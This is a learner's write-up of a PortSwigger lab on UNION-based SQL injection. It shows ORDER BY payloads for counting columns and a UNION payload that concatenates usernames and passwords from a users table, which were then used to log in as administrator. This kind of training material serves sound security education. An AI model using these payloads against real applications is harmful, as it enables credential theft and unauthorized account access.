# SQL Injection UNION Attack — Retrieving Multiple Values in a Single Column

## Overview

I completed the **SQL Injection UNION Attack — Retrieving Multiple Values in a Single Column** lab on PortSwigger Web Security Academy using Burp Suite.

The objective was to retrieve multiple values from the database when only one column was suitable for displaying the required data.

## Determining the Number of Columns

I first used `ORDER BY` to determine how many columns the original query returned.

I tested:

```sql
' ORDER BY 1--
```

```sql
' ORDER BY 2--
```

Both requests returned the product page successfully.

I then tested:

```sql
' ORDER BY 3--
```

This resulted in an Internal Server Error.

This indicated that the original query returned **2 columns**.

In other words:

```text
ORDER BY 1 → ✅
ORDER BY 2 → ✅
ORDER BY 3 → ❌

Original query → 2 columns
```

## UNION Injection

Since the original query returned two columns, my UNION query also needed to return two columns.

I used:

```sql
' UNION SELECT NULL, username || '~' || password FROM users--
```

The query contained two columns:

```text
Column 1 → NULL
Column 2 → username || '~' || password
```

The `NULL` acted as a placeholder for the first column.

The second column concatenated the username and password together.

## Concatenating the Values

The Oracle concatenation operator `||` was used to join the values:

```text
username || '~' || password
```

The `~` character served as a separator.

This produced results similar to:

```text
administrator~password
wiener~password
carlos~password
```

This allowed multiple values to be retrieved through a single column.

## Completing the Lab

The response displayed the users' credentials.

I identified the administrator credentials and used them to authenticate to the administrator account, successfully completing the lab.

## Attack Flow

```text
ORDER BY testing
       ↓
Determine column count
       ↓
Original query = 2 columns
       ↓
Construct 2-column UNION
       ↓
Use NULL as a placeholder
       ↓
Concatenate username + password
       ↓
Retrieve database values
       ↓
Authenticate as administrator
```

## Key Learning

This lab helped me understand that determining the number of columns is an important step in a UNION-based SQL injection.

It also demonstrated that when multiple values need to be retrieved through a single suitable column, those values can be concatenated together using database-specific syntax.

### Memory Trick

**COUNT → MATCH → CONCATENATE → RETRIEVE**

## Tools

* PortSwigger Web Security Academy
* Burp Suite
* Burp Repeater
* Burp Render
* SQL Injection
* UNION-based SQL Injection

## Security Impact

A successful UNION-based SQL injection can potentially allow an attacker to retrieve data from database tables that should not be accessible to them.

If sensitive authentication information is exposed, this could potentially lead to unauthorized account access.

## Conclusion

This lab strengthened my understanding of UNION-based SQL injection by combining several concepts I had previously learned:

* Determining column count with `ORDER BY`
* Matching the UNION column count
* Using `NULL` as a placeholder
* Concatenating multiple database values
* Retrieving sensitive information through the application's response

Another hands-on step in my journey toward understanding Web Application Security and penetration testing.
